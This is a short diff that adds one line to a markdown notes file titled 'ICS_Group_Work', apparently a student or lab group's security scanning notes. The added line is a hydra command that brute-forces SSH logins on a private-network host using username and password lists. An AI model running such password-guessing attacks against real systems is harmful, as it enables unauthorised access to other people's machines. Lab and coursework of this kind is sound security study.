@@ -1,3 +1,5 @@
+hydra -L ~/Desktop/userlist.txt -P ~/Desktop/passlist.txt ssh://172.20.50.110 -t 1 -w 30 -vV -o ~/Desktop/ssh_172.20.50.110.txt
+
 # ICS_Group_Work
 ## 📌 扫描结果总结（已更新详细信息）
 
